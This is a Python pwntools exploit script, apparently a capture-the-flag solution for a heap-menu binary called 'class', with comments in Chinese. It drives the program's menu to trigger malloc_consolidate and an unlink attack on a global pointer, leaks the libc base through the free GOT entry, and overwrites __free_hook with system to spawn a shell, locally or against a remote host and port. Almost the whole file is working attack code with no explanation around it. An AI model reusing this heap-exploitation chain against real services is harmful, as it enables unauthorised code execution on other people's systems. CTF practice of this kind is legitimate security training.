#!/usr/bin/python2
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	待修改数据
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32位使用i386
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

execve_file = './class'
lib_file = './libc.so.6'
gdbscript = '''starti;'''
argv = []






'''
	elf.plt[`symbol`] 获取elf文件中导入符号的plt地址
	elf.got[`symbol`] 获取elf文件中导入符号的got地址
	elf.sym['symbol'] 获取elf文件中本地符号的函数实际地址
'''
if execve_file != None:
	elf = ELF(execve_file)

'''
	lib.sym[`symbol`] 获取lib中符号地址
'''
if lib_file != None:
	lib = ELF(lib_file)

log.info('-----------------------------------------------------------')


'''
	执行爆破攻击
	只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环
	否则程序一直进行循环
'''


def wp_take(r, desc):
	r.recvuntil('6.drop your books\n')
	r.sendline('1')

	r.recvuntil('Please input the class description\n')
	r.send(desc)


def wp_jump(r, desc):
	r.recvuntil('6.drop your books\n')
	r.sendline('2')

	r.recvuntil('Input your class description\n')
	r.send(desc)


def wp_dismiss(r):
	r.recvuntil('6.drop your books\n')
	r.sendline('3')


def wp_buy(r, book):
	r.recvuntil('6.drop your books\n')
	r.sendline('4')

	r.recvuntil('what books do you want?\n')
	r.send(book)


def wp_view(r):
	r.recvuntil('6.drop your books\n')
	r.sendline('5')

	r.recvuntil('These is your books:\n')
	return r.recvuntil('1.take a class')[:-len('1.take a class')]



def wp_drop(r):
	r.recvuntil('6.drop your books\n')
	r.sendline('6')



def wp_modify(r, profile):
	r.recvuntil('6.drop your books\n')
	r.sendline('7')

	r.recvuntil('Input your profile:\n')
	r.send(profile)


def wp_delete(r):
	r.recvuntil('6.drop your books\n')
	r.sendline('8')



def exp():
	if 'd' in sys.argv:
		#r = gdb.debug([execve_file] + argv, gdbscript, env = {'LD_LIBRARY_PATH' : './'})	# 首先加载当前目录下的动态库文件
		r = process([execve_file] + argv)	# 首先加载当前目录下的动态库文件
	else:
		r = remote(sys.argv[1], sys.argv[2])

	r.recvuntil('Whats your name?\n')
	r.sendline('hawk')

	r.recvuntil('Init your profile:\n')
	r.sendline('hawk')


	wp_take(r, 'hawk')
	wp_buy(r, 'hawk')
	

	wp_dismiss(r)
	wp_delete(r)			#this will call malloc_consolidate()
	wp_dismiss(r)			#this is in fast bin


	class_got = 0x6020A8
	wp_take(r, p64(0) + p64(0x31) + p64(class_got - 0x18) + p64(class_got - 0x10) + p64(0) * 2 + p64(0x30)[:7])	#cause fast bin don't change the next_use, and it change in the unsorted bin, so next_use still is 0, and its pre_size is usable, override it to the 0x30

	wp_drop(r)	# this is a unlink attack, change the class_got[0] = class_got - 0x18
	wp_jump(r, p64(1) + p64(elf.got['free']) + p64(1) + p64(class_got - 0x18))
	lib_base = u64((wp_view(r).split('\x7f')[0] + '\x7f').ljust(8, '\x00')) - lib.sym['free']
	log.info('lib_base => %#x'%lib_base)


	wp_jump(r, p64(1) + p64(lib_base + lib.search('/bin/sh').next()) + p64(1) + p64(lib_base + lib.sym['__free_hook']))
	wp_jump(r, p64(lib_base + lib.sym['system']))
	wp_drop(r)

	r.interactive()

exp()

log.info('-----------------------------------------------------------')

